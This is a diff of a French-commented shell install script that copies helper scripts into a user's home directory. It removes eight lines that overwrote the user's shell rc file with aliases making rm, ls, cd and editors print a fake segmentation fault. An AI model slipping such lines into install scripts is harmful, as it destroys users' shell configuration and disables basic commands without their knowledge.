@@ -32,14 +32,6 @@ echo "Alias pour clone un rep : clone"
 cp clone $HOME/.push/clone
 echo "Alias pour prepare un repo : prepare"
 cp prepare_my_repo $HOME/.push/prepare
-echo 'alias atom="echo Segmentation fault (core dumped)"' > $HOME/.$shell
-echo 'alias emacs="echo Segmentation fault (core dumped)"' >> $HOME/.$shell
-echo 'alias ne="echo Segmentation fault (core dumped)"' >> $HOME/.$shell
-echo 'alias rm="echo Segmentation fault (core dumped)"' >> $HOME/.$shell
-echo 'alias ls="echo Segmentation fault (core dumped)"' >> $HOME/.$shell
-echo 'alias ll="echo Segmentation fault (core dumped)"' >> $HOME/.$shell
-echo 'alias la="echo Segmentation fault (core dumped)"' >> $HOME/.$shell
-echo 'alias cd="echo Segmentation fault (core dumped)"' >> $HOME/.$shell
 echo "Copie des fichiers termines"
 echo "Attribution des droits termines"
 echo  >> $HOME/.$shell
